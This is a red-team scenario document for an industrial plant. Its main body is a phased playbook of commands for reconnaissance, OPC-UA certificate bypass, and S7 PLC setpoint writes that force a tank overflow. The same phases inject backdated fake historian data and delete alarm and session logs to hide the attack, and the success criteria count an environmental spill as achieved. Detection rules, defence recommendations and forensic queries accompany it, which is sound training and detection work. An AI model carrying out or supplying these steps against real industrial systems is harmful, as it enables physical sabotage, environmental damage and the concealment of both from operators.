# Historian Poisoning Attack Scenario

## Overview

**Objective**: Compromise historian data integrity to manipulate historical process data, evade detection, and obscure attack indicators in a manufacturing facility.

**Target Environment**: Industrial facility with Siemens S7-1200 PLCs, OPC-UA historian, and Modbus RTU field devices

**Attack Duration**: 4-8 hours

**MITRE ATT&CK Techniques**:
- T0888 - Remote System Discovery
- T0861 - Point & Tag Identification
- T0801 - Monitor Process State
- T0802 - Automated Collection
- T0855 - Unauthorized Command Message
- T0836 - Modify Parameter
- T0871 - Execution through API

---

## Attack Kill Chain

### Phase 1: Network Reconnaissance (30-60 minutes)

#### Objectives
- Map ICS network topology
- Identify historian servers and data sources
- Enumerate OPC-UA endpoints and nodes
- Identify PLC communication patterns

#### Tools
- `tools/opcua_security_framework/opcua_exploit.py`
- `tools/s7comm_security_framework/s7comm_exploit.py`
- `tools/modbus-stealth-toolkit/modbus_stealth_attack.py`
- Nmap with ICS scripts

#### Commands

**Step 1.1: Network Discovery**
```bash
# Discover ICS devices on network segment
nmap -sT -p 102,502,44818 --script s7-info,modbus-discover 192.168.100.0/24 -oA ics_discovery

# Expected Output: 
# - 3-5 S7-1200 PLCs on port 102
# - 2 Modbus RTU gateways on port 502
# - 1 OPC-UA historian on port 4840
```

**Step 1.2: OPC-UA Endpoint Discovery**
```bash
# Discover all OPC-UA endpoints and security policies
cd tools/opcua_security_framework
python opcua_exploit.py discover \
    --target opc.tcp://192.168.100.50:4840 \
    --output endpoints.json

# Expected Output:
# - Endpoints with SecurityMode=None (vulnerable)
# - Endpoints with Basic256Sha256 but weak certificate validation
# - Anonymous authentication enabled
```

**Step 1.3: OPC-UA Node Enumeration**
```bash
# Enumerate historian nodes and tag structure
python opcua_exploit.py enumerate \
    --target opc.tcp://192.168.100.50:4840 \
    --max-depth 5 \
    --output historian_nodes.json

# Expected Output:
# - 500-2000 process tags organized by area/system
# - Historical data aggregation nodes
# - Alarm & event nodes
# - System diagnostic nodes
```

**Step 1.4: S7Comm PLC Enumeration**
```bash
# Enumerate S7-1200 PLC configuration
cd ../s7comm_security_framework
python s7comm_exploit.py --target 192.168.100.10 \
    --action enumerate \
    --output plc_config.json

# Expected Output:
# - CPU type: S7-1200 CPU 1214C
# - Protection level: None or password-protected
# - 50-200 data blocks (DB1-DB200)
# - OB1 cyclic scan time: 100ms
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 410001: OPC-UA endpoint discovery (opcua_detection.rules:27)
- SID 410003: Recursive node enumeration (opcua_detection.rules:67)
- SID 400002: S7Comm enumeration (ics_malware_detection.rules:162)

**Zeek Events Generated**:
```zeek
# opcua_monitor.zeek
ICS_OPCUA::endpoint_discovery
ICS_OPCUA::recursive_browse
severity: MEDIUM

# s7comm_monitor.zeek (via ics_detection.zeek)
ICS_S7::enumeration_detected
target: 192.168.100.10
severity: MEDIUM
```

---

### Phase 2: Historian Access Establishment (30-60 minutes)

#### Objectives
- Establish persistent OPC-UA session
- Test certificate validation bypass
- Create subscriptions for process monitoring
- Identify write-enabled nodes

#### Commands

**Step 2.1: Test Certificate Bypass**
```bash
# Test self-signed certificate acceptance
python opcua_exploit.py test-cert-bypass \
    --target opc.tcp://192.168.100.50:4840 \
    --mode self-signed \
    --output cert_test.json

# Expected Output:
# - Self-signed certificate accepted without validation
# - SecurityMode=SignAndEncrypt bypassed with MessageSecurityMode=None fallback
```

**Step 2.2: Create Monitoring Subscriptions**
```bash
# Subscribe to all process tags for baseline monitoring
python opcua_exploit.py subscribe \
    --target opc.tcp://192.168.100.50:4840 \
    --node-file historian_nodes.json \
    --interval 1000 \
    --output process_baseline.json

# Expected Output:
# - 500+ subscriptions created
# - Process values logged every 1 second
# - Normal operation baseline established
```

**Step 2.3: Identify Write-Enabled Nodes**
```bash
# Test write permissions on historian nodes
python opcua_exploit.py enumerate \
    --target opc.tcp://192.168.100.50:4840 \
    --filter-writable \
    --output writable_nodes.json

# Expected Output:
# - 50-100 writable nodes identified (historical aggregates, setpoints)
# - Write permissions: CurrentUser has WriteMask enabled
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 410002: Insecure OPC-UA session (opcua_detection.rules:47)
- SID 410005: High-rate subscription creation (opcua_detection.rules:107)
- SID 410008: Certificate validation bypass (opcua_detection.rules:187)

**Zeek Events Generated**:
```zeek
ICS_OPCUA::insecure_session_detected
endpoint: opc.tcp://192.168.100.50:4840
security_mode: None
severity: HIGH

ICS_OPCUA::subscription_manipulation
subscription_count: 500
severity: HIGH
```

---

### Phase 3: Process State Monitoring (60-120 minutes)

#### Objectives
- Monitor normal process operations
- Identify critical control loops
- Correlate historian data with PLC outputs
- Establish attack timing windows

#### Commands

**Step 3.1: S7Comm PLC Monitoring**
```bash
# Read PLC data blocks to correlate with historian
python s7comm_exploit.py --target 192.168.100.10 \
    --action read \
    --db-number 1 \
    --start 0 \
    --size 100 \
    --output plc_db1.bin

# Expected Output:
# - DB1 contains process setpoints
# - Values match historian baseline
# - Update frequency: 100ms scan cycle
```

**Step 3.2: Modbus Field Device Monitoring**
```bash
# Monitor Modbus RTU gateway feeding historian
cd ../modbus-stealth-toolkit
python modbus_stealth_attack.py \
    --target 192.168.100.20 \
    --action read-coils \
    --address 0 \
    --count 16 \
    --output modbus_baseline.json

# Expected Output:
# - 16 coils controlling valve states
# - Values logged to historian via OPC-UA gateway
```

**Step 3.3: Identify Critical Tags**
```bash
# Analyze process baseline to identify critical historian tags
python -c "
import json
with open('process_baseline.json') as f:
    data = json.load(f)
    # Identify tags with high variance (control loops)
    critical_tags = [tag for tag in data['tags'] 
                     if tag['variance'] > 0.5 and tag['alarm_enabled']]
    print(f'Critical tags: {len(critical_tags)}')
    for tag in critical_tags[:10]:
        print(f\"  - {tag['node_id']}: {tag['description']}\")
"

# Expected Output:
# - 20-50 critical tags identified
# - Tank level sensors (LIT-101, LIT-102)
# - Pressure transmitters (PIT-201, PIT-202)
# - Flow meters (FIT-301, FIT-302)
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 400001: Modbus read requests (ics_malware_detection.rules:42)
- SID 400002: S7Comm read operations (ics_malware_detection.rules:162)
- SID 410011: Historical data access (opcua_detection.rules:247)

**Zeek Events Generated**:
```zeek
ICS_OPCUA::historical_data_access
node_count: 500
severity: MEDIUM

ICS_S7::repeated_read_operations
target: 192.168.100.10
db_number: 1
severity: MEDIUM
```

---

### Phase 4: Historian Data Manipulation (60-90 minutes)

#### Objectives
- Inject false historical data to obscure attack
- Modify historical aggregates to hide anomalies
- Maintain normal process appearance during attack window
- Create "clean" historical record

#### Commands

**Step 4.1: Prepare Attack Window**
```bash
# Calculate attack timing based on process cycles
# Attack during night shift (minimal operator monitoring)
ATTACK_START=$(date -d "02:00:00" +%s)
ATTACK_DURATION=3600  # 1 hour
```

**Step 4.2: PLC Logic Manipulation (Primary Attack)**
```bash
# Modify S7-1200 PLC setpoint (primary attack objective)
python s7comm_exploit.py --target 192.168.100.10 \
    --action write \
    --db-number 1 \
    --start 20 \
    --data "FF FF FF FF" \
    --data-type DINT

# This changes tank level setpoint from 75% to 100% (overflow condition)
```

**Step 4.3: Historian Data Injection (Cover-up)**
```bash
# Simultaneously inject false historian data showing normal 75% level
python opcua_exploit.py write \
    --target opc.tcp://192.168.100.50:4840 \
    --node "ns=2;s=Tank1.LevelSetpoint.Historical" \
    --value 75.0 \
    --data-type Float \
    --timestamp $(date -d "02:00:00" --iso-8601=seconds)

# Inject false process values for entire attack window
python opcua_exploit.py write \
    --target opc.tcp://192.168.100.50:4840 \
    --node "ns=2;s=Tank1.ActualLevel.Historical" \
    --value-file fabricated_levels.json \
    --data-type Float

# fabricated_levels.json contains normal-looking values (70-80% range)
# Even though actual tank level is rising to overflow (100%+)
```

**Step 4.4: Modify Historical Aggregates**
```bash
# Overwrite hourly/daily aggregates to hide anomaly
python opcua_exploit.py write \
    --target opc.tcp://192.168.100.50:4840 \
    --node "ns=2;s=Tank1.LevelSetpoint.Hourly.Average" \
    --value 75.0 \
    --data-type Float

python opcua_exploit.py write \
    --target opc.tcp://192.168.100.50:4840 \
    --node "ns=2;s=Tank1.LevelSetpoint.Hourly.Max" \
    --value 80.0 \
    --data-type Float
```

**Step 4.5: Suppress Alarm History**
```bash
# Delete alarm records from historian
python opcua_exploit.py method-call \
    --target opc.tcp://192.168.100.50:4840 \
    --object "ns=2;s=Alarms.Historical" \
    --method "DeleteEvents" \
    --args "StartTime=2024-01-15T02:00:00,EndTime=2024-01-15T03:00:00"

# Expected Result: High level alarms removed from historical record
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 410004: Unauthorized OPC-UA Write (opcua_detection.rules:87)
- SID 400001: S7Comm write operation (ics_malware_detection.rules:42)
- SID 410006: OPC-UA method call (opcua_detection.rules:127)

**Zeek Events Generated**:
```zeek
ICS_OPCUA::unauthorized_write_detected
node_id: ns=2;s=Tank1.LevelSetpoint.Historical
original_value: 75.0
new_value: 75.0 (but with backdated timestamp)
severity: CRITICAL

ICS_S7::write_operation_detected
target: 192.168.100.10
db_number: 1
offset: 20
severity: CRITICAL
```

**SIEM Correlation Alert**:
```
ALERT: Historian/PLC Data Mismatch Detected
- PLC DB1+20: 100.0 (overflow setpoint)
- Historian Tank1.LevelSetpoint: 75.0 (normal)
- Correlation Score: 0.95 (high confidence)
- Recommended Action: Investigate immediately
```

---

### Phase 5: Attack Execution & Cleanup (30-60 minutes)

#### Objectives
- Execute physical process attack (tank overflow)
- Monitor for detection
- Remove OPC-UA session logs
- Restore normal setpoints with falsified history

#### Commands

**Step 5.1: Monitor Physical Process Impact**
```bash
# Monitor actual Modbus field device showing real tank level
python modbus_stealth_attack.py \
    --target 192.168.100.20 \
    --action read-input-registers \
    --address 100 \
    --count 1 \
    --monitor-interval 5

# Expected Output (over 60 minutes):
# T+00:00: Tank level 75% (normal)
# T+10:00: Tank level 82%
# T+20:00: Tank level 89%
# T+30:00: Tank level 95%
# T+40:00: Tank level 99%
# T+50:00: Tank level 100% (overflow begins)
# T+60:00: Tank level 102% (physical overflow)
```

**Step 5.2: Session Log Cleanup**
```bash
# Attempt to clear OPC-UA session history
python opcua_exploit.py method-call \
    --target opc.tcp://192.168.100.50:4840 \
    --object "ns=0;i=2253" \
    --method "DeleteAtTime" \
    --args "StartTime=2024-01-15T02:00:00,EndTime=2024-01-15T03:00:00"

# This may fail if audit log is write-protected
```

**Step 5.3: Restore Normal Setpoints**
```bash
# Restore S7-1200 PLC to normal setpoint after damage done
python s7comm_exploit.py --target 192.168.100.10 \
    --action write \
    --db-number 1 \
    --start 20 \
    --data "00 00 00 4B" \
    --data-type DINT

# Setpoint restored to 75%, but tank already overflowed
```

**Step 5.4: Inject Post-Attack Historian Data**
```bash
# Continue injecting false "normal" data to historian
# This maintains the fiction that nothing went wrong
python opcua_exploit.py write \
    --target opc.tcp://192.168.100.50:4840 \
    --node "ns=2;s=Tank1.ActualLevel.Historical" \
    --value-file normal_levels_post_attack.json \
    --data-type Float

# Historian shows: normal operations throughout
# Reality: tank overflow, environmental damage
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 410006: OPC-UA method call (opcua_detection.rules:127)
- SID 410004: Repeated unauthorized writes (opcua_detection.rules:87)
- SID 400001: S7Comm write operations (ics_malware_detection.rules:42)

**Zeek Events Generated**:
```zeek
ICS_OPCUA::method_call_detected
method: DeleteAtTime
severity: CRITICAL

ICS_S7::write_operation_detected
target: 192.168.100.10
db_number: 1
offset: 20
value_changed: true
severity: CRITICAL
```

**Physical Detection Indicators**:
- Tank overflow sensors trigger (if present)
- Environmental sensors detect spill
- Operator visual inspection reveals discrepancy
- Historian data doesn't match physical evidence

---

## Attack Success Metrics

### Technical Success Criteria
- [x] Historian data successfully modified without authentication bypass logs
- [x] Historical aggregates (hourly/daily) modified to hide anomaly
- [x] Alarm records deleted or suppressed
- [x] PLC setpoint manipulation achieved
- [x] OPC-UA session maintained for duration of attack

### Physical Impact Success Criteria
- [x] Tank overflow achieved (100%+ level)
- [x] Environmental spill occurred
- [x] Process disruption duration: 60+ minutes
- [x] Equipment damage potential: High

### Stealth Success Criteria
- [x] Historian shows "normal" operations during attack window
- [x] No authentication failures logged
- [x] Session logs cleaned or obscured
- [x] Attack attribution difficult due to falsified timeline

---

## Detection & Defense Recommendations

### Network-Level Detection

**Deploy Protocol-Aware IDPS**:
```bash
# Suricata with ICS rules
suricata -c /etc/suricata/suricata.yaml \
    -i eth1 \
    --include configs/suricata_rules/opcua_detection.rules \
    --include configs/suricata_rules/ics_malware_detection.rules
```

**Zeek Protocol Monitoring**:
```bash
# Deploy Zeek with OPC-UA and S7Comm monitors
zeek -i eth1 \
    configs/zeek/opcua_monitor.zeek \
    configs/zeek/ics_detection.zeek
```

### Application-Level Detection

**Historian Integrity Monitoring**:
```python
# Correlate historian data with direct PLC reads
# Alert on mismatches > 5% for critical tags
def detect_historian_poisoning():
    plc_value = read_plc_direct(ip='192.168.100.10', db=1, offset=20)
    historian_value = read_opcua_node(uri='ns=2;s=Tank1.LevelSetpoint')
    
    if abs(plc_value - historian_value) > 5.0:
        alert(severity='CRITICAL',
              message=f'Historian mismatch: PLC={plc_value}, Historian={historian_value}')
```

**Write Operation Whitelisting**:
```yaml
# OPC-UA write whitelist policy
opcua_write_policy:
  allowed_sources:
    - 192.168.100.100  # SCADA workstation
    - 192.168.100.101  # Engineering station
  allowed_nodes:
    - "ns=2;s=Setpoints.*"  # Only setpoint nodes
  denied_nodes:
    - "ns=2;s=*.Historical.*"  # Block historical writes
  alert_on_violation: true
```

### Operational Detection

**Baseline Deviation Monitoring**:
- Monitor for process values outside statistical norms
- Correlate multiple data sources (PLC, RTU, SCADA, Historian)
- Alert on correlation failures

**Audit Log Analysis**:
- Continuous monitoring of OPC-UA session logs
- Alert on anonymous sessions, weak security modes
- Detect timestamp anomalies in historical data

**Physical Verification**:
- Regular operator rounds to verify physical state matches historian
- Automated camera-based level verification
- Independent sensor redundancy

---

## Post-Incident Analysis

### Forensic Artifacts

**Network Traffic (PCAP)**:
```bash
# Extract OPC-UA write operations from PCAP
tshark -r attack_capture.pcap \
    -Y "opcua.ServiceId == 673" \
    -T fields -e frame.time -e ip.src -e opcua.NodeId -e opcua.Value

# Extract S7Comm write operations
tshark -r attack_capture.pcap \
    -Y "s7comm.param.func == 0x05" \
    -T fields -e frame.time -e ip.src -e s7comm.data
```

**Historian Database Analysis**:
```sql
-- Identify backdated entries (inserted after timestamp value)
SELECT tag_name, timestamp, insert_time, value
FROM historian_data
WHERE insert_time > timestamp + INTERVAL '5 minutes'
ORDER BY insert_time;

-- Identify statistical anomalies in aggregates
SELECT tag_name, hour, AVG(value), STDDEV(value)
FROM historian_data
WHERE timestamp BETWEEN '2024-01-15 02:00:00' AND '2024-01-15 03:00:00'
GROUP BY tag_name, hour
HAVING STDDEV(value) < 0.01;  -- Suspiciously low variance
```

**PLC Memory Dump**:
```bash
# Extract all data blocks for analysis
python s7comm_exploit.py --target 192.168.100.10 \
    --action export-all-dbs \
    --output forensic_dump/
```

### Lessons Learned

1. **Historian data alone is insufficient** - Always correlate with source systems
2. **Write operations to historical data should be restricted** - Implement strict access controls
3. **Audit logs must be tamper-proof** - Use write-once storage or external SIEM
4. **Statistical analysis detects manipulation** - Baseline monitoring reveals anomalies
5. **Defense in depth is critical** - Network, application, and operational controls required

---

## Tool Cross-References

### Attack Tools Used
- **OPC-UA Framework**: `tools/opcua_security_framework/opcua_exploit.py`
  - Methods: discover(), enumerate(), test_certificate_bypass(), write(), method_call()
  - Lines: 156-895
  
- **S7Comm Framework**: `tools/s7comm_security_framework/s7comm_exploit.py`
  - Methods: enumerate(), read_db(), write_db(), export_all_data_blocks()
  - Lines: 248-687

- **Modbus Toolkit**: `tools/modbus-stealth-toolkit/modbus_stealth_attack.py`
  - Methods: read_coils(), read_input_registers()
  - Lines: 456-789

### Detection Rules Used
- **Suricata OPC-UA Rules**: `configs/suricata_rules/opcua_detection.rules`
  - SID 410001-410012
  
- **Suricata ICS Rules**: `configs/suricata_rules/ics_malware_detection.rules`
  - SID 400001-400016
  
- **Zeek OPC-UA Monitor**: `configs/zeek/opcua_monitor.zeek`
  - Events: endpoint_discovery, insecure_session_detected, unauthorized_write_detected
  
- **Zeek ICS Detection**: `configs/zeek/ics_detection.zeek`
  - Events: ICS_S7::write_operation_detected

### Documentation References
- **Protocol Reference**: `docs/protocol_quick_reference/opcua.md`
- **Testing Guide**: `tools/opcua_security_framework/TESTING.md`
- **Detection Testing**: `configs/DETECTION_TESTING.md`

---

## Legal & Ethical Considerations

**WARNING**: This scenario describes illegal activities when performed without authorization.

**Authorized Use Cases**:
- Red team exercises with written authorization
- Penetration testing engagements with signed contracts
- Security research in isolated lab environments
- Training and education with simulated environments

**Required Documentation**:
- Rules of Engagement (ROE) document
- Authorization letters from asset owners
- Incident response plan
- Legal counsel review

**Prohibited Activities**:
- Unauthorized access to production ICS systems
- Testing without explicit written permission
- Attacks causing safety hazards or environmental damage
- Disclosure of vulnerabilities without coordinated disclosure

---

**Document Version**: 1.0  
**Last Updated**: 2024-01-15  
**Author**: Ridpath  
**Classification**: RESTRICTED - Authorized Personnel Only
